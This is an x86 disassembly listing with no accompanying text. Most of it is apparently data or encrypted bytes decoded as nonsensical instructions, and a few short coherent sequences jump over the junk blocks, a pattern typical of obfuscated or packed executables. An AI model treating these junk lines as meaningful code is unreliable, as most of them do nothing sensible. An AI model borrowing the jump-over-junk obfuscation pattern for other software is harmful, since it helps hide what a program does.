  402919:	fstp   QWORD PTR [edx-0x2cff62cf]
  40291f:	sti    
  402920:	retf   
  402921:	mov    BYTE PTR [ebx+esi*2-0xe4bb6dd],al
  402928:	or     BYTE PTR [eax-0x1a140b99],al
  40292e:	and    edx,edi
  402930:	repz xor BYTE PTR [bx],cl
  402934:	hlt    
  402935:	or     eax,0x4a21977d
  40293a:	clc    
  40293b:	repz pop eax
  40293d:	outs   dx,BYTE PTR ds:[esi]
  40293e:	mov    esi,0x36e51277
  402943:	stos   BYTE PTR es:[edi],al
  402944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402945:	dec    bp
  402947:	xchg   edx,eax
  402948:	jno    0x40297f
  40294a:	pop    esp
  40294b:	fdivr  st(1),st
  40294d:	dec    ecx
  40294e:	add    ebx,DWORD PTR [eax+0x66]
  402951:	jo     0x4028ee
  402953:	out    0xd0,eax
  402955:	sbb    BYTE PTR [ecx+eiz*4-0x3b642db2],0x48
  40295d:	enter  0x91a5,0x56
  402961:	xor    ecx,esp
  402963:	int3   
  402964:	test   BYTE PTR [ecx-0x1c],bh
  402967:	mov    edx,0xad39342b
  40296c:	and    cl,BYTE PTR [edx]
  40296e:	xchg   edx,eax
  40296f:	adc    bh,ah
  402971:	xchg   BYTE PTR [eax+eax*4+0x1a4a19c0],ch
  402978:	rcl    esi,cl
  40297a:	pusha  
  40297b:	mov    ds:0x5c3a10cb,eax
  402980:	mov    cl,0x15
  402982:	dec    edx
  402983:	push   eax
  402984:	jmp    0x40293f
  402986:	shl    BYTE PTR [esi],cl
  402988:	inc    esp
  402989:	out    0xe9,eax
  40298b:	push   0x1ba905fe
  402990:	jae    0x402981
  402992:	das    
  402993:	fst    QWORD PTR fs:[ebp+0x33]
  402997:	pop    ds
  402998:	icebp  
  402999:	dec    esi
  40299a:	loopne 0x40293f
  40299c:	cwde   
  40299d:	adc    DWORD PTR [esi+ebx*8],ebx
  4029a0:	jle    0x402a1a
  4029a2:	aam    0xa9
  4029a4:	stos   DWORD PTR es:[edi],eax
  4029a5:	pop    es
  4029a6:	fsub   st(2),st
  4029a8:	sbb    esi,DWORD PTR [edi]
  4029aa:	pop    ebp
  4029ab:	test   DWORD PTR [edi+0x42],0x32124e68
  4029b2:	rol    BYTE PTR [ebx],0x5c
  4029b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029b6:	pop    esp
  4029b7:	popf   
  4029b8:	add    al,0xdb
  4029ba:	and    al,0xdb
  4029bc:	loopne 0x402a38
  4029be:	imul   edx,edx,0x6d4b1893
  4029c4:	pop    esi
  4029c5:	pop    eax
  4029c6:	inc    ecx
  4029c7:	pop    ss
  4029c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029c9:	cs sub al,0xce
  4029cc:	ins    BYTE PTR es:[edi],dx
  4029cd:	and    DWORD PTR [ecx],ebp
  4029cf:	neg    BYTE PTR es:[ebx+0x783382e]
  4029d6:	or     BYTE PTR [edx+0x725f887f],bl
  4029dc:	lods   al,BYTE PTR ds:[esi]
  4029dd:	jp     0x402962
  4029df:	mov    ebp,0xde0fc97c
  4029e4:	dec    eax
  4029e5:	retf   0xcc5c
  4029e8:	pop    edx
  4029e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029ea:	bswap  edx
  4029ec:	cmp    ebp,esi
  4029ee:	test   al,ch
  4029f0:	int    0x8a
  4029f2:	push   cs
  4029f3:	fisubr DWORD PTR [edx-0x68]
  4029f6:	bound  eax,QWORD PTR ds:0xc0f431af
  4029fc:	gs jmp 0x4029ba
  4029ff:	sub    dh,BYTE PTR [edx-0x7d]
  402a02:	(bad)  [edx+0x23]
  402a05:	cwde   
  402a06:	(bad)  
  402a07:	ds push esi
  402a09:	ds into 
  402a0b:	mov    ebp,0x2c8a5ad
  402a10:	sub    DWORD PTR [ebx-0x1a],0xffffff8b
  402a14:	inc    ebp
  402a15:	aam    0xf
  402a17:	test   DWORD PTR [ebx],eax
  402a19:	add    BYTE PTR [eax],al
  402a1b:	add    BYTE PTR [ebx-0x39cc0fbb],cl
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	jnp    0x4029d8
  402a36:	call   0xfa7e:0x7e0daaaf
  402a3d:	jg     0x402abd
  402a3f:	jle    0x402a48
  402a41:	dec    esp
  402a42:	test   eax,ebx
  402a44:	ins    BYTE PTR es:[edi],dx
  402a45:	ret    0x6e48
  402a48:	sbb    BYTE PTR [esi+ebp*4],ch
  402a4b:	retw   
  402a4d:	pop    esp
  402a4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a4f:	cld    
  402a50:	jb     0x402a60
  402a52:	cmp    eax,0x238ae01
  402a57:	out    dx,eax
  402a58:	pop    es
  402a59:	jno    0x402a2b
  402a5b:	mov    ds:0x1b61f5dc,eax
  402a60:	inc    ebx
  402a61:	enter  0xccfb,0x2e
  402a65:	add    eax,0x95987650
  402a6a:	sbb    al,0xa4
  402a6c:	push   0x45154454
  402a71:	or     ah,BYTE PTR [ebx]
  402a73:	jp     0x402acc
  402a75:	adc    esp,ebx
  402a77:	push   eax
  402a78:	das    
  402a79:	aam    0x5d
  402a7b:	push   ss
  402a7c:	fcom   QWORD PTR [edi+0x5d]
  402a7f:	popf   
  402a80:	mov    bh,0x52
  402a82:	dec    eax
  402a83:	inc    esi
  402a84:	mov    ah,0x34
  402a86:	and    edx,DWORD PTR [edi-0x1aa38249]
  402a8c:	out    dx,eax
  402a8d:	mov    edx,DWORD PTR [ebp-0x2e7d83ed]
  402a93:	data16 aas 
  402a95:	repnz aam 0xe2
  402a98:	inc    ebp
  402a99:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  402a9b:	mov    bh,0xfa
  402a9d:	xchg   BYTE PTR [ebx-0x774ba861],cl
  402aa3:	pop    ebp
  402aa4:	push   ebp
  402aa5:	(bad)  
  402aa6:	pop    ds
  402aa7:	scas   eax,DWORD PTR es:[edi]
  402aa8:	inc    ebx
  402aa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402aaa:	cwde   
  402aab:	(bad)  
  402aac:	adc    eax,0x426d3a88
  402ab1:	not    DWORD PTR [ebx]
  402ab3:	(bad)  
  402ab4:	daa    
  402ab5:	push   ebp
  402ab6:	daa    
  402ab7:	into   
  402ab8:	xlat   BYTE PTR ds:[ebx]
  402ab9:	int3   
  402aba:	aaa    
  402abb:	adc    edx,DWORD PTR [esp+ecx*4]
  402abe:	mov    edx,0x3a542046
  402ac3:	imul   edi,DWORD PTR [edx+0x59a3974c],0xffffff89
  402aca:	xchg   DWORD PTR [ebx+0x2f],ebp
  402acd:	sub    ecx,DWORD PTR [ebx]
  402acf:	jg     0x402ac0
  402ad1:	int3   
  402ad2:	inc    ebp
  402ad3:	shr    al,cl
  402ad5:	or     BYTE PTR [esi],ah
  402ad7:	jmp    0x402af6
  402ad9:	dec    ebp
  402ada:	js     0x402b23
  402adc:	popf   
  402add:	scas   al,BYTE PTR es:[edi]
  402ade:	es std 
  402ae0:	ficomp WORD PTR [ecx+0x2c709090]
  402ae6:	or     DWORD PTR [ebx],esp
  402ae8:	cld    
  402ae9:	int    0xed
  402aeb:	ror    BYTE PTR ds:0xab5f4963,cl
  402af1:	addr16 xor al,0x1
  402af4:	add    BYTE PTR [edx-0x12],bl
  402af7:	pop    ecx
  402af8:	loope  0x402ac4
  402afa:	sub    eax,esp
  402afc:	and    al,0x84
  402afe:	xor    DWORD PTR [esi],esi
  402b00:	shl    BYTE PTR [ebp+eax*4+0x5a],0xcf
  402b05:	inc    ecx
  402b06:	(bad)  
  402b07:	adc    edx,DWORD PTR [esi-0x4b]
  402b0a:	push   es
  402b0b:	(bad)  
  402b0c:	sbb    eax,0x2c9c10e6
  402b11:	(bad)  
  402b12:	and    ecx,eax
  402b14:	inc    edx
  402b15:	in     eax,dx
  402b16:	cmp    bl,BYTE PTR [edx+0x14]
  402b19:	sbb    ebx,DWORD PTR [edi+0x1a]
  402b1c:	mov    edi,0xf4b73e3e
  402b21:	pop    ss
  402b22:	ins    DWORD PTR es:[edi],dx
  402b23:	popf   
  402b24:	jl     0x402ab7
  402b26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b27:	ds mov ch,0x4d
  402b2a:	test   cl,ah
  402b2c:	mov    bl,0xdd
  402b2e:	mov    ecx,0x772c6a3e
  402b33:	mov    ds:0x311ec3a8,eax
  402b38:	std    
  402b39:	pop    ds
  402b3a:	stc    
  402b3b:	mov    al,ds:0xcb16733a
  402b40:	ror    edi,cl
  402b42:	dec    ecx
  402b43:	out    dx,eax
  402b44:	cdq    
  402b45:	fild   DWORD PTR [ebx+0x4a7040b7]
  402b4b:	fdivr  QWORD PTR [ebp+0x1b1a06c7]
  402b51:	cmp    BYTE PTR [edx],0xff
  402b54:	dec    eax
  402b56:	(bad)  
  402b57:	push   ebp
  402b58:	in     al,dx
  402b59:	repnz xlat BYTE PTR ds:[ebx]
  402b5b:	fist   DWORD PTR [ebx+0x6b]
  402b5e:	mov    al,0x3
  402b60:	cld    
  402b61:	mov    esi,0x37e8f82f
  402b66:	(bad)  
  402b68:	cmp    ah,BYTE PTR ds:0xc0b569c2
  402b6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b6f:	lock mov bl,0xea
  402b72:	cmp    BYTE PTR [edx+0x3d39830f],al
  402b78:	mov    edi,0x480127e1
  402b7d:	cmp    BYTE PTR [esi+ebp*1-0x670c84a6],bh
  402b84:	neg    DWORD PTR [ecx+0x24]
  402b87:	adc    DWORD PTR [eax+0x5c],ecx
  402b8a:	dec    eax
  402b8b:	call   0xad3b861d
  402b90:	push   ebp
  402b91:	repnz xchg edi,eax
  402b93:	xchg   dh,dh
  402b95:	clc    
  402b96:	repnz push ebp
  402b98:	inc    esi
  402b99:	mov    BYTE PTR [esi-0x5847b432],0x13
  402ba0:	dec    edx
  402ba1:	mov    di,0xde69
  402ba5:	mov    ah,0x31
  402ba7:	inc    eax
  402ba8:	adc    eax,0x549b5b0f
  402bad:	pushf  
  402bae:	loop   0x402be0
  402bb0:	mov    ds:0x37e95adc,al
  402bb5:	sbb    BYTE PTR [ebp-0x40a4cbc2],dh
  402bbb:	or     ebx,esp
  402bbd:	pusha  
  402bbe:	shl    DWORD PTR [ebx],cl
  402bc0:	ins    DWORD PTR es:[edi],dx
  402bc1:	shl    DWORD PTR [ecx*1-0x7bf03f7b],1
  402bc8:	sub    BYTE PTR [eax],al
  402bca:	add    BYTE PTR [eax],al
  402bcc:	lea    eax,[ebp-0x98]
  402bd2:	push   eax
  402bd3:	mov    eax,DWORD PTR [ebp-0x1c]
  402bd6:	xor    eax,esi
  402bd8:	add    eax,edi
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	ja     0x402c23
  402c13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c14:	int    0x36
  402c16:	or     edi,DWORD PTR [esi+0x7e]
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402c10
  402c1e:	xor    al,0xd0
  402c20:	pop    edi
  402c21:	ins    BYTE PTR es:[edi],dx
  402c22:	mov    esi,DWORD PTR [ebx+0x3bffe5]
  402c28:	inc    edx
  402c29:	int3   
  402c2a:	xor    edx,DWORD PTR [ecx-0x27f4ea70]
  402c30:	inc    ecx
  402c31:	mov    ch,ch
  402c33:	(bad)  
  402c36:	cmp    ebp,esi
  402c38:	dec    eax
  402c39:	stos   BYTE PTR es:[edi],al
  402c3a:	xor    eax,0xcc5a4dec
  402c3f:	jmp    0x402c65
  402c41:	outs   dx,BYTE PTR ds:[esi]
  402c42:	mov    cl,ah
  402c44:	retf   0x15af
  402c47:	ds (bad) 
  402c49:	xor    eax,ebp
  402c4b:	enter  0x40ae,0xf3
  402c4f:	jl     0x402cc1
  402c51:	inc    edi
  402c52:	jne    0x402bf5
  402c54:	retf   
  402c55:	push   ds
  402c56:	add    DWORD PTR [ebx],eax
  402c58:	or     dl,BYTE PTR [edx-0x47080743]
  402c5e:	dec    eax
  402c5f:	pop    ecx
  402c60:	icebp  
  402c61:	dec    esp
  402c62:	inc    esp
  402c63:	sbb    ecx,esp
  402c65:	lods   al,BYTE PTR ds:[esi]
  402c66:	mov    ebp,0xcd527b11
  402c6b:	xchg   edx,eax
  402c6c:	sahf   
  402c6d:	fwait
  402c6e:	inc    ebp
  402c6f:	pushf  
  402c70:	repnz push ebx
  402c72:	and    edi,ecx
  402c74:	and    eax,0xb33550d3
  402c79:	jne    0x402cc5
  402c7b:	lahf   
  402c7c:	(bad)  
  402c7e:	cdq    
  402c7f:	sar    ch,0xd
  402c82:	(bad)  
  402c83:	push   cs
  402c84:	pop    edi
  402c85:	pushf  
  402c86:	mov    edi,0xeeb212fd
  402c8c:	xor    cl,BYTE PTR [eax+0xbb9b814]
  402c92:	(bad)  
  402c93:	sub    BYTE PTR [eax+0x4c],ah
  402c96:	call   0x9c6a:0xc6e4420d
  402c9d:	loop   0x402d13
  402c9f:	pop    es
  402ca0:	pop    ss
  402ca1:	mov    eax,0x6036cf2
  402ca6:	call   0x3a431ae5
  402cab:	scas   eax,DWORD PTR es:[edi]
  402cac:	stc    
  402cad:	jmp    0x86bb3348
  402cb2:	mov    ds:0xd7b8cf5,al
  402cb7:	syscall 
  402cb9:	ror    BYTE PTR es:[esi-0x1a13741],cl
  402cc0:	add    ebp,DWORD PTR [edi-0x2b358784]
  402cc6:	adc    eax,0x32f13504
  402ccb:	mov    cl,0x6d
  402ccd:	cmp    ecx,DWORD PTR [ecx]
  402ccf:	mov    esi,DWORD PTR ds:0xc00922c4
  402cd5:	stos   BYTE PTR es:[edi],al
  402cd6:	pop    ss
  402cd7:	push   edi
  402cd8:	mov    BYTE PTR [edi-0x2e0eda36],bl
  402cde:	ficomp WORD PTR [edx+0x36c1a11c]
  402ce4:	(bad)  
  402ce5:	iret   
  402ce6:	sub    dh,BYTE PTR [edi-0x57ccb893]
  402cec:	ins    BYTE PTR es:[edi],dx
  402ced:	and    BYTE PTR [eax],al
  402cef:	ret    0x2516
  402cf2:	cmp    DWORD PTR [esi-0x6d],edi
  402cf5:	sti    
  402cf6:	out    0xd1,al
  402cf8:	imul   esi,DWORD PTR [edi+0x28],0xb87ae3e2
  402cff:	pop    esp
  402d00:	mov    eax,0xe97f279e
  402d05:	fdiv   st,st(6)
  402d07:	sti    
  402d08:	retf   
  402d09:	mov    ds:0xfb278976,al
  402d0e:	adc    ebx,ebx
  402d10:	pop    ebp
  402d11:	xchg   esp,eax
  402d12:	sti    
  402d13:	xchg   edi,eax
  402d14:	data16 cmp al,0x5
  402d17:	sub    al,0xf3
  402d19:	or     DWORD PTR [esi+0x69b9b220],esi
  402d1f:	mov    ecx,0x6e68408c
  402d24:	mov    bh,0xff
  402d26:	inc    eax
  402d27:	xor    eax,0x2cabd496
  402d2c:	xor    BYTE PTR [eax],ch
  402d2e:	lea    ebx,[edi-0x19519286]
  402d34:	xor    DWORD PTR [ebx],edi
  402d36:	jecxz  0x402d94
  402d38:	or     eax,0x7b91b77d
  402d3d:	or     DWORD PTR ds:0xf98f7e6,ebx
  402d43:	sub    edi,DWORD PTR [edx-0x2ab42e49]
  402d49:	dec    edx
  402d4a:	jecxz  0x402dba
  402d4c:	aas    
  402d4d:	scas   eax,DWORD PTR es:[edi]
  402d4e:	popa   
  402d4f:	out    dx,eax
  402d50:	out    0x1f,eax
  402d52:	cmp    cl,BYTE PTR [esi]
  402d54:	jg     0x402dad
  402d56:	js     0x402d50
  402d58:	jp     0x402d67
  402d5a:	shr    DWORD PTR [ebp+esi*1-0x5b],cl
  402d5e:	push   cs
  402d5f:	ror    ah,0x57
  402d62:	dec    esi
  402d63:	or     al,0x82
  402d65:	mov    ebx,0xfbafef54
  402d6a:	mov    esi,DWORD PTR [ebx]
  402d6c:	sahf   
  402d6d:	jne    0x402d67
  402d6f:	mov    ebx,0xfa71cc37
  402d74:	ror    DWORD PTR [ebx+edi*4-0x7c1a3980],cl
  402d7b:	add    dh,BYTE PTR [edi-0x6749ed58]
  402d81:	nop
  402d82:	pop    ds
  402d83:	out    0x9f,eax
  402d85:	rcr    ebp,cl
  402d87:	lds    ebp,FWORD PTR [ecx]
  402d89:	in     al,0x93
  402d8b:	xchg   edi,eax
  402d8c:	xchg   esi,eax
  402d8d:	xor    DWORD PTR [esi+0x5246e0ae],esi
  402d93:	or     ah,ah
  402d95:	fisttp WORD PTR [ebx+0x4c4cd5d6]
  402d9b:	push   esi
  402d9c:	mov    BYTE PTR [ebp+edx*4-0x10],dl
  402da0:	into   
  402da1:	sub    eax,DWORD PTR [ebp-0x4]
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [esi+eiz*2-0x37],1
  402de7:	cmc    
  402de8:	and    dh,BYTE PTR [edx-0x58181f8]
  402dee:	jg     0x402e6e
  402df0:	jle    0x402e14
  402df2:	mov    bh,0x8e
  402df4:	cmp    esi,DWORD PTR gs:[eax+esi*1-0x3a6fb5d3]
  402dfc:	fstp   QWORD PTR [ebx-0x5b]
  402dff:	stc    
  402e00:	ins    BYTE PTR es:[edi],dx
  402e01:	(bad)
  402e04:	mov    al,0x50
  402e06:	mov    dl,0xa5
  402e08:	or     DWORD PTR [ebx+ecx*4-0x6aa7293e],esi
  402e0f:	inc    ebp
  402e10:	add    ah,BYTE PTR [eax]
  402e12:	shl    bh,0x79
  402e15:	in     eax,0x71
  402e17:	into   
  402e18:	into   
  402e19:	ret    0xfde1
  402e1c:	test   eax,0x6548797a
  402e21:	repz jg 0x402e73
  402e24:	int3   
  402e25:	sar    DWORD PTR [ebx-0xd],1
  402e28:	ja     0x402e31
  402e2a:	mov    ebx,0x6620e29
  402e2f:	rcl    ebx,cl
  402e31:	jne    0x402eab
  402e33:	rcl    BYTE PTR [edi-0x55],0x8c
  402e37:	mov    esi,0xbd2d41e1
  402e3c:	(bad)  
  402e3d:	sbb    dh,al
  402e3f:	ins    BYTE PTR es:[edi],dx
  402e40:	outs   dx,DWORD PTR ds:[esi]
  402e41:	push   esi
  402e42:	ss jecxz 0x402e28
  402e45:	and    al,0x2a
  402e47:	add    eax,0xf6951179
  402e4c:	xor    dl,BYTE PTR [ebp+edi*8+0x75c7f396]
  402e53:	sbb    eax,edx
  402e55:	sub    DWORD PTR [ecx],ebx
  402e57:	arpl   WORD PTR [ebp+0x45],di
  402e5a:	fldcw  WORD PTR [esi]
  402e5c:	aaa    
  402e5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e5e:	pop    esi
  402e5f:	jne    0x402e69
  402e61:	iret   
  402e62:	cld    
  402e63:	xchg   edi,eax
  402e64:	(bad)  
  402e65:	loop   0x402e14
  402e67:	rcl    DWORD PTR [esi-0x69],0x3b
  402e6b:	arpl   WORD PTR [edi-0x43],sp
  402e6e:	cmc    
  402e6f:	push   ebx
  402e70:	hlt    
  402e71:	pop    ecx
  402e72:	xor    bl,BYTE PTR [ebx]
  402e74:	push   0xa30491c3
  402e79:	xlat   BYTE PTR ds:[ebx]
  402e7a:	mov    ebx,0x216ce2d0
  402e7f:	xchg   edi,eax
  402e80:	ins    DWORD PTR es:[edi],dx
  402e81:	push   edx
  402e82:	(bad)  
  402e83:	xor    al,0xee
  402e85:	mov    esi,0x9f02a1
  402e8a:	cmp    DWORD PTR [esi+0x7456308b],esp
  402e90:	adc    bl,cl
  402e92:	jp     0x402ef9
  402e94:	stc    
  402e95:	cdq    
  402e96:	inc    esp
  402e97:	push   ss
  402e98:	idiv   BYTE PTR [esi-0xb478e0e]
  402e9e:	repnz mov cs:0xf66803db,al
  402ea5:	and    DWORD PTR [esi-0x30022ff1],ebx
  402eab:	xchg   DWORD PTR [bp+0x573f],ecx
  402eb0:	(bad)  
  402eb1:	inc    DWORD PTR [ebp+eiz*1-0x15392261]
  402eb8:	ds ins DWORD PTR es:[edi],dx
  402eba:	mov    ebp,0xf1aa255e
  402ebf:	xor    eax,0xdce4e4ab
  402ec4:	xor    DWORD PTR [edx-0x3e],0xffffffb2
  402ec8:	jb     0x402ee6
  402eca:	test   eax,0x5326ae8b
  402ecf:	jl     0x402ec3
  402ed1:	into   
  402ed2:	dec    esi
  402ed3:	iret   
  402ed4:	js     0x402eb9
  402ed6:	jb     0x402ef9
  402ed8:	sbb    cl,ch
  402eda:	pop    ss
  402edb:	sbb    edx,DWORD PTR [ebx+0x7e96efd3]
  402ee1:	or     ebp,edx
  402ee3:	or     al,0xb5
  402ee5:	in     al,dx
  402ee6:	fnstsw WORD PTR [ecx-0x45]
  402ee9:	adc    BYTE PTR [edx-0x76],ch
  402eec:	cs inc ebx
  402eee:	mov    ecx,es
  402ef0:	cwde   
  402ef1:	test   al,0xbc
  402ef3:	or     ebx,ebx
  402ef5:	in     eax,0x4c
  402ef7:	call   0x38da:0x89e28fb2
  402efe:	xor    BYTE PTR [edi+esi*8+0x62],al
  402f02:	mov    edx,0x3427294f
  402f07:	xchg   esp,eax
  402f08:	enter  0xf705,0x46
  402f0c:	xchg   ecx,eax
  402f0d:	mov    ecx,ebx
  402f0f:	cmp    BYTE PTR [ebx+0x7d8856f7],dh
  402f15:	dec    edx
  402f16:	ins    DWORD PTR es:[edi],dx
  402f17:	mov    eax,ds:0x33d84c42
  402f1c:	dec    edx
  402f1d:	push   0xfffffffd
  402f1f:	fldcw  WORD PTR [ebx-0x7555bfac]
  402f25:	adc    bl,dl
  402f27:	mov    esi,0xcd1867a7
  402f2c:	mov    WORD PTR [ebx-0x7f],ss
  402f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f30:	xor    eax,0x4791eb77
  402f35:	ffreep st(7)
  402f37:	rcr    BYTE PTR [esi],0x8f
  402f3a:	push   ebp
  402f3b:	cli    
  402f3c:	add    BYTE PTR ds:0xf8d7cf76,dl
  402f42:	cmp    DWORD PTR [edi+0x5f631803],esp
  402f48:	fwait
  402f49:	and    edi,DWORD PTR [eax-0xf]
  402f4c:	in     eax,dx
  402f4d:	and    edx,ebp
  402f4f:	cli    
  402f50:	fsubr  QWORD PTR [edx]
  402f52:	jo     0x402f2d
  402f54:	xchg   edi,eax
  402f55:	push   esi
  402f56:	dec    ebx
  402f57:	xchg   ebx,eax
  402f58:	enter  0x42ee,0xf3
  402f5c:	push   ecx
  402f5d:	stos   DWORD PTR es:[edi],eax
  402f5e:	sub    esp,edx
  402f60:	inc    edi
  402f61:	pop    esi
  402f62:	test   BYTE PTR [eax-0x5d],bl
  402f65:	dec    ebp
  402f66:	cmp    BYTE PTR [ebp+0x3f5af278],ch
  402f6c:	xchg   ebx,eax
  402f6d:	mov    edx,esi
  402f6f:	xchg   edx,eax
  402f70:	mov    ecx,0xdb1bf8d3
  402f75:	lea    eax,ds:0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi-0x5dd25a49]
  402fae:	sbb    ebx,esi
  402fb0:	ds push ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x40300f
  402fb9:	test   BYTE PTR [esi-0xd],bl
  402fbc:	retf   0x78
  402fbf:	rcr    al,0x76
  402fc2:	outs   dx,BYTE PTR ds:[esi]
  402fc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fc4:	xor    esi,0xa3df1a38
  402fca:	(bad)
  402fce:	mov    BYTE PTR [edx],dh
  402fd0:	test   al,0xb0
  402fd2:	nop
  402fd3:	mov    eax,eax
  402fd5:	fwait
  402fd6:	inc    ebx
  402fd7:	mov    esp,0x832474dd
  402fdc:	dec    esi
  402fdd:	jbe    0x402f8d
  402fdf:	je     0x402ff6
  402fe1:	arpl   WORD PTR [edx],ax
  402fe3:	sub    cl,BYTE PTR es:[eax-0x13f79d4f]
  402fea:	leave  
  402feb:	push   es
  402fec:	ss ror eax,0xb4
  402ff0:	rcr    BYTE PTR [edx],0x7
  402ff3:	inc    edi
  402ff4:	leave  
  402ff5:	mov    ah,0x9f
  402ff7:	mul    BYTE PTR [esi+edi*4-0x21d4ee19]
  402ffe:	adc    al,0xb2
  403000:	les    eax,FWORD PTR [eax-0x71]
  403003:	pop    ds
  403004:	in     eax,0xf1
  403006:	stc    
  403007:	fst    QWORD PTR [edi+0x48]
  40300a:	test   eax,0xf94c6681
  40300f:	data16 jecxz 0x402fc1
  403012:	test   DWORD PTR [edi-0x51],esp
  403015:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403016:	sub    BYTE PTR [ebx+0x42],bh
  403019:	inc    edx
  40301a:	(bad)  
  40301b:	ror    BYTE PTR [eax],0x51
  40301e:	dec    ecx
  40301f:	push   esp
  403020:	or     bh,dh
  403022:	adc    dl,ch
  403024:	or     DWORD PTR [ebx],0x414266ae
  40302a:	int    0xe2
  40302c:	xchg   edi,eax
  40302d:	add    al,0x4c
  40302f:	ins    DWORD PTR es:[edi],dx
  403030:	(bad)  
  403032:	sbb    esi,DWORD PTR [edx+0x66]
  403035:	sub    DWORD PTR [edx],esp
  403037:	daa    
  403038:	test   DWORD PTR [eax],esp
  40303a:	test   al,0x8e
  40303c:	cmp    esi,DWORD PTR [eax+0x64]
  40303f:	dec    edi
  403040:	int    0xcd
  403042:	xchg   ebx,eax
  403043:	in     eax,0x3b
  403045:	sub    BYTE PTR [eax+0x6e5c823c],ch
  40304b:	and    eax,0xc68ecf61
  403050:	scas   eax,DWORD PTR es:[edi]
  403051:	mov    dl,0xd4
  403053:	test   eax,0x6c02487
  403058:	jbe    0x403064
  40305a:	mov    edi,0xf36f44fa
  40305f:	adc    bl,BYTE PTR [edx-0x58]
  403062:	and    BYTE PTR [eax],dh
  403064:	std    
  403065:	jle    0x403005
  403067:	pop    ss
  403068:	and    edx,DWORD PTR [eax-0x28d1e980]
  40306e:	cli    
  40306f:	stos   DWORD PTR es:[edi],eax
  403070:	adc    eax,DWORD PTR [ecx+0x72]
  403073:	daa    
  403074:	and    al,0xcc
  403076:	mov    al,0xd0
  403078:	cmp    dh,ch
  40307a:	or     esp,0x45780b43
  403080:	pop    edx
  403081:	inc    esp
  403082:	(bad)  
  403083:	std    
  403084:	out    dx,eax
  403085:	jne    0x403035
  403087:	push   eax
  403088:	fmul   DWORD PTR [ebp-0x731efacf]
  40308e:	ins    DWORD PTR es:[edi],dx
  40308f:	ret    0x3f7e
  403092:	push   0x10599d6
  403097:	shr    DWORD PTR [eax+0x37b3d3be],cl
  40309d:	lods   al,BYTE PTR ds:[esi]
  40309e:	fbstp  TBYTE PTR [edx-0x15]
  4030a1:	(bad)  
  4030a2:	push   ebx
  4030a3:	mov    dl,0x8d
  4030a5:	sub    DWORD PTR [esp+esi*8+0x63a2b915],ebx
  4030ac:	pusha  
  4030ad:	pusha  
  4030ae:	mov    ebx,0x3d60ed63
  4030b3:	mov    dh,0x2
  4030b5:	adc    BYTE PTR [edi],0xb3
  4030b8:	aas    
  4030b9:	xor    al,BYTE PTR gs:[eax]
  4030bc:	cmp    DWORD PTR [ebx+0x3cd4e87e],0xffffff96
  4030c3:	mov    edi,0x8d26a808
  4030c8:	push   edi
  4030c9:	sbb    dh,BYTE PTR [ebx+0x5290dccc]
